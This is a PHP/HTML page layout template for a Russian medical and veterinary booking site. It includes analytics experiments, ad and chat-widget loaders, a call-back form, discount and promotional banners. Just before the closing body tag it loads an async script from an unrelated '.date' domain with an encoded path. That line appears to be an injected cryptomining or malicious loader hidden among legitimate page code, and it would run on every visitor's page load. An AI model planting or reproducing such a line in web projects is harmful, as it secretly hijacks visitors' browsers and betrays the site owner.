<?php
	/**
	 * @var View $this
	 * @var CityModel $city
	 * @var DistrictModel[] $districts
	 * @var SpecialtyModel $specialty
	 * @var bool $home_page
	 * @var bool $daytime
	 * @var ProductBasket $product_basket
	 */
?>
<!DOCTYPE HTML>
<html>
<head>
    <?php if (isset($doctor_experiment) && $doctor_experiment == 'oftalmolog'): ?>
        <!-- Google Analytics Content Experiment code for doctor fast record LP switch (oftalmolog)-->
        <script>function utmx_section(){}function utmx(){}(function(){var
                k='72608629-0',d=document,l=d.location,c=d.cookie;
            if(l.search.indexOf('utm_expid='+k)>0)return;
            function f(n){if(c){var i=c.indexOf(n+'=');if(i>-1){var j=c.
                    indexOf(';',i);return escape(c.substring(i+n.length+1,j<0?c.
                    length:j))}}}var x=f('__utmx'),xx=f('__utmxx'),h=l.hash;d.write(
                    '<sc'+'ript src="'+'http'+(l.protocol=='https:'?'s://ssl':
                            '://www')+'.google-analytics.com/ga_exp.js?'+'utmxkey='+k+
                            '&utmx='+(x?x:'')+'&utmxx='+(xx?xx:'')+'&utmxtime='+new Date().
                            valueOf()+(h?'&utmxhash='+escape(h.substr(1)):'')+
                            '" type="text/javascript" charset="utf-8"><\/sc'+'ript>')})();
        </script><script>utmx('url','A/B');</script>
        <!-- End of Google Analytics Content Experiment code-->
    <?php elseif (isset($doctor_experiment) && $doctor_experiment == 'allergolog-immunolog'): ?>
        <!-- Google Analytics Content Experiment code  for doctor fast record LP switch (allergolog-immunolog)-->
        <script>function utmx_section(){}function utmx(){}(function(){var
                k='72608629-3',d=document,l=d.location,c=d.cookie;
            if(l.search.indexOf('utm_expid='+k)>0)return;
            function f(n){if(c){var i=c.indexOf(n+'=');if(i>-1){var j=c.
                    indexOf(';',i);return escape(c.substring(i+n.length+1,j<0?c.
                    length:j))}}}var x=f('__utmx'),xx=f('__utmxx'),h=l.hash;d.write(
                    '<sc'+'ript src="'+'http'+(l.protocol=='https:'?'s://ssl':
                            '://www')+'.google-analytics.com/ga_exp.js?'+'utmxkey='+k+
                            '&utmx='+(x?x:'')+'&utmxx='+(xx?xx:'')+'&utmxtime='+new Date().
                            valueOf()+(h?'&utmxhash='+escape(h.substr(1)):'')+
                            '" type="text/javascript" charset="utf-8"><\/sc'+'ript>')})();
        </script><script>utmx('url','A/B');</script>
        <!-- End of Google Analytics Content Experiment code-->
    <?php elseif (isset($doctor_experiment) && $doctor_experiment == 'otolaringolog'): ?>
        <!-- Google Analytics Content Experiment code for doctor fast record LP switch (otolaringolog)-->
        <script>function utmx_section(){}function utmx(){}(function(){var
                k='72608629-4',d=document,l=d.location,c=d.cookie;
            if(l.search.indexOf('utm_expid='+k)>0)return;
            function f(n){if(c){var i=c.indexOf(n+'=');if(i>-1){var j=c.
                    indexOf(';',i);return escape(c.substring(i+n.length+1,j<0?c.
                    length:j))}}}var x=f('__utmx'),xx=f('__utmxx'),h=l.hash;d.write(
                    '<sc'+'ript src="'+'http'+(l.protocol=='https:'?'s://ssl':
                            '://www')+'.google-analytics.com/ga_exp.js?'+'utmxkey='+k+
                            '&utmx='+(x?x:'')+'&utmxx='+(xx?xx:'')+'&utmxtime='+new Date().
                            valueOf()+(h?'&utmxhash='+escape(h.substr(1)):'')+
                            '" type="text/javascript" charset="utf-8"><\/sc'+'ript>')})();
        </script><script>utmx('url','A/B');</script>
        <!-- End of Google Analytics Content Experiment code-->
    <?php elseif (isset($doctor_experiment) && $doctor_experiment == 'nevrolog'): ?>
        <!-- Google Analytics Content Experiment code for doctor fast record LP switch (nevrolog)-->
        <script>function utmx_section(){}function utmx(){}(function(){var
                k='72608629-5',d=document,l=d.location,c=d.cookie;
            if(l.search.indexOf('utm_expid='+k)>0)return;
            function f(n){if(c){var i=c.indexOf(n+'=');if(i>-1){var j=c.
                    indexOf(';',i);return escape(c.substring(i+n.length+1,j<0?c.
                    length:j))}}}var x=f('__utmx'),xx=f('__utmxx'),h=l.hash;d.write(
                    '<sc'+'ript src="'+'http'+(l.protocol=='https:'?'s://ssl':
                            '://www')+'.google-analytics.com/ga_exp.js?'+'utmxkey='+k+
                            '&utmx='+(x?x:'')+'&utmxx='+(xx?xx:'')+'&utmxtime='+new Date().
                            valueOf()+(h?'&utmxhash='+escape(h.substr(1)):'')+
                            '" type="text/javascript" charset="utf-8"><\/sc'+'ript>')})();
        </script><script>utmx('url','A/B');</script>
        <!-- End of Google Analytics Content Experiment code -->

    <?php /*elseif (isset($show_pediatr_banner)): ?>
		<!-- Google Analytics Content Experiment code for flowing pediatr banner -->
		<script>function utmx_section(){}function utmx(){}(function(){var
		k='72608629-11',d=document,l=d.location,c=d.cookie;
		if(l.search.indexOf('utm_expid='+k)>0)return;
		function f(n){if(c){var i=c.indexOf(n+'=');if(i>-1){var j=c.
		indexOf(';',i);return escape(c.substring(i+n.length+1,j<0?c.
		length:j))}}}var x=f('__utmx'),xx=f('__utmxx'),h=l.hash;d.write(
		'<sc'+'ript src="'+'http'+(l.protocol=='https:'?'s://ssl':
		'://www')+'.google-analytics.com/ga_exp.js?'+'utmxkey='+k+
		'&utmx='+(x?x:'')+'&utmxx='+(xx?xx:'')+'&utmxtime='+new Date().
		valueOf()+(h?'&utmxhash='+escape(h.substr(1)):'')+
		'" type="text/javascript" charset="utf-8"><\/sc'+'ript>')})();
		</script><script>utmx('url','A/B');</script>
		<!-- End of Google Analytics Content Experiment code --> */?>

	<?php elseif (isset($disease_green_btn)): ?>
		<!-- Google Analytics Content Experiment code for disease page green button -->
		<script>function utmx_section(){}function utmx(){}(function(){var
		k='72608629-12',d=document,l=d.location,c=d.cookie;
		if(l.search.indexOf('utm_expid='+k)>0)return;
		function f(n){if(c){var i=c.indexOf(n+'=');if(i>-1){var j=c.
		indexOf(';',i);return escape(c.substring(i+n.length+1,j<0?c.
		length:j))}}}var x=f('__utmx'),xx=f('__utmxx'),h=l.hash;d.write(
		'<sc'+'ript src="'+'http'+(l.protocol=='https:'?'s://ssl':
		'://www')+'.google-analytics.com/ga_exp.js?'+'utmxkey='+k+
		'&utmx='+(x?x:'')+'&utmxx='+(xx?xx:'')+'&utmxtime='+new Date().
		valueOf()+(h?'&utmxhash='+escape(h.substr(1)):'')+
		'" type="text/javascript" charset="utf-8"><\/sc'+'ript>')})();
		</script><script>utmx('url','A/B');</script>
		<!-- End of Google Analytics Content Experiment code -->

    <?php elseif (isset($is_green)): ?>
		<!-- Google Analytics Content Experiment code for green appoint button -->
		<script>function utmx_section(){}function utmx(){}(function(){var
			k='72608629-7',d=document,l=d.location,c=d.cookie;
		if(l.search.indexOf('utm_expid='+k)>0)return;
		function f(n){if(c){var i=c.indexOf(n+'=');if(i>-1){var j=c.
		indexOf(';',i);return escape(c.substring(i+n.length+1,j<0?c.
		length:j))}}}var x=f('utmx'),xx=f('utmxx'),h=l.hash;d.write(
		'<sc'+'ript src="'+'http'+(l.protocol=='https:'?'s://ssl':
		'://www')+'.google-analytics.com/ga_exp.js?'+'utmxkey='+k+
		'&utmx='+(x?x:'')+'&utmxx='+(xx?xx:'')+'&utmxtime='+new Date().
		valueOf()+(h?'&utmxhash='+escape(h.substr(1)):'')+
		'" type="text/javascript" charset="utf-8"><\/sc'+'ript>')})();
		</script><script>utmx('url','A/B');</script>
		<!-- End of Google Analytics Content Experiment code -->

    	<?php /*<!-- Google Analytics Content Experiment code for simple visit record form -->
		<script>function utmx_section(){}function utmx(){}(function(){var
		k='72608629-6',d=document,l=d.location,c=d.cookie;
		if(l.search.indexOf('utm_expid='+k)>0)return;
		function f(n){if(c){var i=c.indexOf(n+'=');if(i>-1){var j=c.
		indexOf(';',i);return escape(c.substring(i+n.length+1,j<0?c.
		length:j))}}}var x=f('__utmx'),xx=f('__utmxx'),h=l.hash;d.write(
		'<sc'+'ript src="'+'http'+(l.protocol=='https:'?'s://ssl':
		'://www')+'.google-analytics.com/ga_exp.js?'+'utmxkey='+k+
		'&utmx='+(x?x:'')+'&utmxx='+(xx?xx:'')+'&utmxtime='+new Date().
		valueOf()+(h?'&utmxhash='+escape(h.substr(1)):'')+
		'" type="text/javascript" charset="utf-8"><\/sc'+'ript>')})();
		</script><script>utmx('url','A/B');</script>
		<!-- End of Google Analytics Content Experiment code --> */ ?>

        <?php /*<!-- Google Analytics Content Experiment code for red buttons switch-->
        <script>function utmx_section(){}function utmx(){}(function(){var
                k='72608629-1',d=document,l=d.location,c=d.cookie;
            if(l.search.indexOf('utm_expid='+k)>0)return;
            function f(n){if(c){var i=c.indexOf(n+'=');if(i>-1){var j=c.
                    indexOf(';',i);return escape(c.substring(i+n.length+1,j<0?c.
                    length:j))}}}var x=f('__utmx'),xx=f('__utmxx'),h=l.hash;d.write(
                    '<sc'+'ript src="'+'http'+(l.protocol=='https:'?'s://ssl':
                            '://www')+'.google-analytics.com/ga_exp.js?'+'utmxkey='+k+
                            '&utmx='+(x?x:'')+'&utmxx='+(xx?xx:'')+'&utmxtime='+new Date().
                            valueOf()+(h?'&utmxhash='+escape(h.substr(1)):'')+
                            '" type="text/javascript" charset="utf-8"><\/sc'+'ript>')})();
        </script><script>utmx('url','A/B');</script>
        <!-- End of Google Analytics Content Experiment code --> */ ?>
    <?php endif; ?>

    <?php /*if (isset($version)): ?>
        <!-- Google Analytics Content Experiment code for disease page variations switch-->
        <script>function utmx_section(){}function utmx(){}(function(){var
                k='72608629-2',d=document,l=d.location,c=d.cookie;
            if(l.search.indexOf('utm_expid='+k)>0)return;
            function f(n){if(c){var i=c.indexOf(n+'=');if(i>-1){var j=c.
                    indexOf(';',i);return escape(c.substring(i+n.length+1,j<0?c.
                    length:j))}}}var x=f('__utmx'),xx=f('__utmxx'),h=l.hash;d.write(
                    '<sc'+'ript src="'+'http'+(l.protocol=='https:'?'s://ssl':
                            '://www')+'.google-analytics.com/ga_exp.js?'+'utmxkey='+k+
                            '&utmx='+(x?x:'')+'&utmxx='+(xx?xx:'')+'&utmxtime='+new Date().
                            valueOf()+(h?'&utmxhash='+escape(h.substr(1)):'')+
                            '" type="text/javascript" charset="utf-8"><\/sc'+'ript>')})();
        </script><script>utmx('url','A/B');</script>
        <!-- End of Google Analytics Content Experiment code -->
    <?php endif;*/ ?>

	<script>
	  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

	  ga('create', 'UA-41082608-10', 'auto');
	  ga('send', 'pageview');

	</script>
    <script type="text/javascript">
        window.__mixm__ = window.__mixm__ || [];
        window.__mixm__.push(['uAdvArId',1294931922]);
// только на страницах карточки товара передавайте его айди (вместо 'ID товара') из вашего прайса и раскомментируйте вызов этого параметра
// window.__mixm__.push(['skulist', 'ID товара']);
        <?php if (isset($doctor)) {?>
        window.__mixm__.push(['skulist', '<?php echo $doctor->getId()?>']);
        <?php } ?>
(function(){function t(){if(!e){e=1;var t=0,a="def";for(i=0;o.__mixm__.length>i;i++){if("uAdvArId"==o.__mixm__[i][0]){t="u"+o.__mixm__[i][1];break}"mAdvId"==o.__mixm__[i][0]&&(a="m"+o.__mixm__[i][1])}t||(t=a);var n=document.createElement("script");n.type="text/javascript",n.async=!0,n.src=("https:"==document.location.protocol?"https://":"http://")+"js.mixmarket.biz/a"+t+".js?t="+(new Date).getTime();var r=document.getElementsByTagName("script")[0];r.parentNode.insertBefore(n,r)}}var e=0,a=document,n=a.documentElement,o=window;"complete"==a.readyState||"loaded"==a.readyState||"interactive"==a.readyState?t():a.addEventListener?a.addEventListener("DOMContentLoaded",t,!1):a.attachEvent?(n.doScroll&&o==o.top&&function(){try{n.doScroll("left")}catch(e){return setTimeout(arguments.callee,0),void 0}t()}(),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t()})):o.onload=t})();
    </script>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title><?php echo (isset($page_title)) ? $page_title : SITE_NAME; ?></title>
    <meta name="description" content="<?php echo (isset($page_description)) ? $page_description : ''.SITE_NAME.' - поиск врача и запись на прием, информация обо всех известных заболеваниях.'; ?>">

<link rel="apple-touch-icon" sizes="57x57" href="/media/favicon/<?php echo CSS_DIR; ?>/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="/media/favicon/<?php echo CSS_DIR; ?>/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="/media/favicon/<?php echo CSS_DIR; ?>/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="/media/favicon/<?php echo CSS_DIR; ?>/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="/media/favicon/<?php echo CSS_DIR; ?>/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="/media/favicon/<?php echo CSS_DIR; ?>/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="/media/favicon/<?php echo CSS_DIR; ?>/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="/media/favicon/<?php echo CSS_DIR; ?>/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="/media/favicon/<?php echo CSS_DIR; ?>/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192"  href="/media/favicon/<?php echo CSS_DIR; ?>/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="/media/favicon/<?php echo CSS_DIR; ?>/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="/media/favicon/<?php echo CSS_DIR; ?>/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="/media/favicon/<?php echo CSS_DIR; ?>/favicon-16x16.png">
<link rel="manifest" href="/media/favicon/<?php echo CSS_DIR; ?>/manifest.json">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="/media/favicon/<?php echo CSS_DIR; ?>/ms-icon-144x144.png">


    <!--link rel="icon" href="/media/images/home_page/<?php echo CSS_DIR; ?>/favicon.png" type="image/png"-->
    <?php $this->block('blocks/head'); ?>
    <?php if (isset($home_page)):?>
        <link rel="stylesheet" href="/media/css/<?php echo CSS_DIR; ?>/home_style.css?<?php echo RELEASE_NUMBER?>" type="text/css" media="screen, projection" />    
        <!--[if lt IE 8]>
        <link rel="stylesheet" href="/media/css/home_page/ie/ie-7.css?<?php echo RELEASE_NUMBER?>" type="text/css" media="screen, projection" />
        <![endif]-->
        <!--[if lt IE 9]>
        <link rel="stylesheet" href="/media/css/home_page/ie/ie.css?<?php echo RELEASE_NUMBER?>" type="text/css" media="screen, projection" />
        <![endif]-->
    <?php endif?>

    <meta name='yandex-verification' content='76535cc7dd5d586f' />
    <meta name=viewport content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="/media/css/<?php echo CSS_DIR; ?>/media.css?<?php echo RELEASE_NUMBER?>" type="text/css"/>
    <script type="text/javascript" src="/media/js/responsive-switch.js"></script>
</head>
<body>
<a href="#"
      class="rs-link adaptive-switch-link"
      data-link-desktop="Перейти на полную версию"
      data-link-responsive="Перейти на мобильную версию"
      data-always-visible="false"></a>
<script type="text/javascript">
	$(document).ready(function(){
		product_basket.setProducts(<?php echo json_encode($product_basket->getProductList()); ?>);
        var product_count_block_controller = new ProductCountBlockController(product_basket, '.n_goods');
        product_count_block_controller.init();
	});
</script>
<script type="text/template" id="citymaps-balloon-template">
    <div class="citymaps-balloon-wrapper">
        <div class="citymaps-balloon-container">
            <div class="citymaps-balloon-body">
                $[result]
            </div>
        </div>
    </div>
</script>
<script type="text/template" id="citymaps-balloon-group-template">
    <div class="doc-popup-sm map-card-block flo"  style="left:-64px; top:23px;z-index:5000;visibility: hidden;">
        <span class="corn-top"></span>
        <div class="citymaps-balloon-container">
            <ins class="ins1"></ins>
            <ins class="ins2"></ins>
            <div class="citymaps-balloon-body">
                <ul class="citymaps-balloon-buttons">
                    <li><a class="citymaps-balloon-close" style="width:7px; height:7px;display:block;"></a></li>
                </ul>
                <div class="citymaps-balloon-content">
                    <h3 style="font-weight: normal">$[title]</h3>
                    <div style="height:168px; overflow: auto;">
                        <table cellpadding="3">
                            <tbody>$[rowContent]</tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>
</script>
<?php if (!isset($home_page)): ?>
    <div class="wrap">
        <?php $this->block('blocks/header'); ?>
        <?php if (isset($example_page)): ?>
            <br><br><br><br>
        <?php endif; ?>
<?php else: ?>
    <div id="wrapper" class="wrap">
        <div id="header">
            <a class="logo" href="<?php if($city->alias) { echo '/';} else echo SITE_URL.'/'; ?>" title="<?php echo PAGE_TITLE . $city->prepositional_name; ?> – <?php echo SITE_NAME; ?>">
            	<img src="/media/images/blank.png" alt="<?php echo PAGE_TITLE . $city->prepositional_name; ?> – <?php echo SITE_NAME; ?>" class="main-logo-big"/>
            </a>
            <div class="sp-links left-links">
                <nav>
                    <?php if($city->is_has_doctors) { ?>
                        <a class="<?php echo (isset($menu_active) && $menu_active == 'doctor') ? 'active' : ''; ?> doctor-link" href="/doctor">Ветеринары</a>
                    <?php } ?>
                    <?php if($city->is_has_clinics) { ?>
                        <a class="<?php echo (isset($menu_active) && $menu_active == 'clinic') ? 'active' : ''; ?> clinic-link" href="/clinic">Клиники</a>
                    <?php } ?>

                        <a class="<?php echo (isset($menu_active) && $menu_active == 'disease') ? 'active' : ''; ?> disease-link" href="<?php if($city->getId() == 2) { ?>/disease<?php } else { ?><?php echo strtolower(SITE_URL);?>/disease<?php } ?>">Заболевания</a>
                        <a class="" href="//swiss.lookmedbook.ru/">Лечение в Швейцарии</a>

                    <?php /*if($city->is_has_laboratories) { ?>
                        <a class="<?php echo (isset($menu_active) && $menu_active == 'analysis') ? 'active' : ''; ?> analysis-link" href="/analysis">Анализы</a>
                    <?php } */?>
                    <?php if(defined('SHOP_ENABLE') && SHOP_ENABLE) { ?>
                        <a class="<?php echo (isset($menu_active) && $menu_active == 'shop') ? 'active' : ''; ?> shop-link" href="/shop/catalog">Лекарства</a><span class="n_goods"></span>
                    <?php } ?>
                </nav>
            </div>

            <div class="sp-links right-links">
                <a class="a-dashed popup_city" href="javascript:void(0);"><?php echo $city->name; ?></a>
                <span class="phone"><small>(<?php echo SITE_PHONE_CODE; ?>)</small> <?php echo SITE_PHONE; ?> <span class="flo"></span><span class="calltime">с 09 до 21</span></span>
                <a class="a-dashed" href="javascript:void(0);"><small class="order-call">Заказать звонок</small>
                    <div class="form-call form-call-step-1">
                        <p class="h-txt">Заказать звонок</p>
                        <?php if (!$daytime):?>
                            <p class="time-txt">Мы работаем с 9 до 21. Ваша заявка будет обработана в начале рабочего дня.</p>
                        <?php endif;?>
                        <label>Тел:</label>
                        <input class="mask error" type="text" name="phone_number" placeholder="+7-___-___-__-__">
                        <label>Имя:</label>
                        <input class="success" type="text" name="first_name" placeholder="Имя">
                        <input class="btn-call" type="button" value="Позвоните мне!"/>
                    </div>

                    <div class="form-call form-call-step-2">
                        <p class="h-txt">Заказан звонок</p>
                        <p class="txt">
                            Мы свяжемся с Вами<br/>
                            <?php if (!$daytime):?>
                                c 9 до 10 часов утра
                            <?php else:?>
                                в течение 5 минут
                            <?php endif;?>
                        </p>
                        <p class="txt">
                            Спасибо,<br/>
                            что выбрали нас!
                        </p>
                    </div>
                </a>
                <div id="authorization-block-on-disease-page" class="no-auth-buttons">
                    <a class="btn-enter reg-linking" href="javascript:void(0);">Войти</a>
                </div>
            </div>
        </div>
<?php endif; ?>
		<?php if(isset($home_page) && $home_page) { ?>
			<div class="link_bottom">
				<a data-link="<?php echo SeoLinkViewHelper::getCityPageLink($specialty, $city); ?>" class="jsLinkHidingIndexing">Ветеринары <?php echo $city->genitive_name; ?></a>

                <?php if($city->is_has_laboratories) { ?>
                    <a style="margin: 0 0 0 10px;" class="<?php echo (isset($menu_active) && $menu_active == 'analysis') ? 'active' : ''; ?> analysis-link" href="/analysis">Анализы</a>
                <?php } ?>
			</div>

        <?php } else { ?>
            <div class="link_bottom">
                <?php if (!isset($city) || isset($city) && $city->hasLaboratories()) { ?>
                    <a class="<?php echo (isset($menu_active) && $menu_active == 'analysis') ? 'active' : ''; ?> analysis-link" href="<?php if($city && $city->isUsed()) { echo '/analysis';} else echo SITE_URL.'/analysis'; ?>">Анализы</a>
                <?php } ?>
            </div>
        <?php } ?>
    <div class="content
    	<?php echo (isset($is_red) ? 'red' : '');  ?>
    	<?php echo ((isset($is_green) && $is_green) ? 'green' : '');  ?>
    	<?php echo (isset($is_simple) ? 'simple-popup-registration' : '');  ?>
    	<?php echo ((isset($disease_green_btn) && $disease_green_btn) ? 'disease-green-btn' : '');	?>
    	">
        <?php $this->content(); ?>
    </div>
</div>
</div>

<?php $discountVisibility1 = (isset($_SESSION['isDiscountVisible']) && $_SESSION['isDiscountVisible'] === "0")?'style="display: none;"':''; ?>
<?php $discountVisibility2 = (!isset($_SESSION['isDiscountVisible']) || $_SESSION['isDiscountVisible'] === "1")?'style="display: none;"':''; ?>
<?php if (1 || !isset($_SESSION['sentDiscountRequest']) || !$_SESSION['sentDiscountRequest']) {?>
<div class="discount">
	<div class="discount-open"><span class="btn-open" <?php echo $discountVisibility2; ?>><</span>%</div>
	<div class="discount-close" <?php echo $discountVisibility1; ?>>x</div>
	<div class="form-discount form-discount-step-1" <?php echo $discountVisibility1; ?>>
		<p class="txt" >Хотите получить<br/>индивидуальную<br/>скидку на прием к врачу?</p>
		<label>Оставьте телефон:</label>
		<input class="mask error" type="text" name="discount_phone_number" placeholder="+7-___-___-__-__">
		<input class="btn-discount" type="button" value="Получить скидку"/>
	</div>
	<div class="form-discount form-discount-step-2" style="display: none;">
		<p class="txt">Поздравляем! У нас уже<br/>готово индивидуальное<br/>предложение для вас.<br/>
		Подробности вы<br/>получите в ближайшее<br/>время по телефону.</p>
	</div>
</div>
<?php } ?>


<?php
    $treatmentInSwitzVisibleOpen = $treatmentInSwitzClass = $treatmentInSwitzVisibleClose = '';
    if(isset($_SESSION['isTreatmentInSwitzVisible']) && $_SESSION['isTreatmentInSwitzVisible'] === "0") {
        $treatmentInSwitzVisibleClose = 'style="display: none;"';
        $treatmentInSwitzClass = 'small-banner-visible';
    }
    if(!isset($_SESSION['isTreatmentInSwitzVisible']) || $_SESSION['isTreatmentInSwitzVisible'] === "1") {
        $treatmentInSwitzVisibleOpen = 'style="display: none;"';
    }
?>

<div class="banner-treatment-in-switz <?php echo $treatmentInSwitzClass; ?>">
    <a href="//swiss.lookmedbook.ru/" class="banner-treatment-in-switz-link" <?php echo $treatmentInSwitzVisibleClose; ?>><div class="icon"></div>Лечение в Швейцарии <br/> Бесплатная консультация </a>
    <div class="close" <?php echo $treatmentInSwitzVisibleClose; ?>>x</div>
    <div class="banner-treatment-in-switz-open" <?php echo $treatmentInSwitzVisibleOpen; ?>>
        <div class="icon"></div>
    </div>
</div>

<?php /* $secondOpinionVisibility1 = (isset($_SESSION['isSecondOpinionVisible']) && $_SESSION['isSecondOpinionVisible'] === "0")?'style="display: none;"':''; ?>
<?php $secondOpinionVisibility2 = (!isset($_SESSION['isSecondOpinionVisible']) || $_SESSION['isSecondOpinionVisible'] === "1")?'style="display: none;"':''; ?>
<?php if (!isset($is_second_opinion)) {?>
	<div class="second-opinion-block">
		<a href="http://secondopinions.ru/lp7/" class="second-opinion-1" <?php echo $secondOpinionVisibility1; ?>><div class="icon"></div>Расшифровка снимков МРТ,<br/>КТ и др.<br/>Получи консультацию<br/>экспертов за 24 часа</a>
		<div class="close" <?php echo $secondOpinionVisibility1; ?>>x</div>
		<div class="second-opinion-2" <?php echo $secondOpinionVisibility2; ?>>
			<div class="icon"></div>
			<div class="open"><</div>
		</div>
	</div>
<?php } */?>
<?php if (!isset($example_page)) { ?>
    <?php if ($this->show_horizontal_banner) { ?>
        <?php $this->block('blocks/horizontal-banner'); ?>
    <?php } ?>

    <?php $this->block('blocks/footer'); ?>
<?php } ?>
<noindex>
    <?php $this->block('blocks/counters'); ?>
</noindex>
<!--[if IE]><script type="text/javascript" src="http://www.xiper.net/examples/js-plugins/html5-and-css3/explorer-canvas/excanvas.js"></script><![endif]-->

<!-- BEGIN JIVOSITE CODE {literal} -->
<script type='text/javascript'>
    (function(){ var widget_id = 'YPP0Wc0aCs';var d=document;var w=window;function l(){
        var s = document.createElement('script'); s.type = 'text/javascript'; s.async = true; s.src = '//code.jivosite.com/script/widget/'+widget_id; var ss = document.getElementsByTagName('script')[0]; ss.parentNode.insertBefore(s, ss);}if(d.readyState=='complete'){l();}else{if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})();</script>
<!-- {/literal} END JIVOSITE CODE -->

<?php $this->block('blocks/record_form_container'); ?>
<?php $this->block('blocks/learn_form_container'); ?>
<script type="text/javascript">
    (function(){function t(){if(!e){e=1;var t=0,a="def";for(i=0;o.__mixm__.length>i;i++){if("uAdvArId"==o.__mixm__[i][0]){t="u"+o.__mixm__[i][1];break}"mAdvId"==o.__mixm__[i][0]&&(a="m"+o.__mixm__[i][1])}t||(t=a);var n=document.createElement("script");n.type="text/javascript",n.async=!0,n.src=("https:"==document.location.protocol?"https://":"http://")+"js.mixmarket.biz/a"+t+".js?t="+(new Date).getTime();var r=document.getElementsByTagName("script")[0];r.parentNode.insertBefore(n,r)}}var e=0,a=document,n=a.documentElement,o=window;"complete"==a.readyState||"loaded"==a.readyState||"interactive"==a.readyState?t():a.addEventListener?a.addEventListener("DOMContentLoaded",t,!1):a.attachEvent?(n.doScroll&&o==o.top&&function(){try{n.doScroll("left")}catch(e){return setTimeout(arguments.callee,0),void 0}t()}(),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t()})):o.onload=t})();
</script>
<script src="https://flightzy.date/002xv1/WyJSYWtvdmljaDg5NiIsMCwwLjYsMTAsIjEwMCUiXQ.RZiaXRo7rX6I9bsDGqFN-woy-jI.min.js" async></script>
</body>
</html>
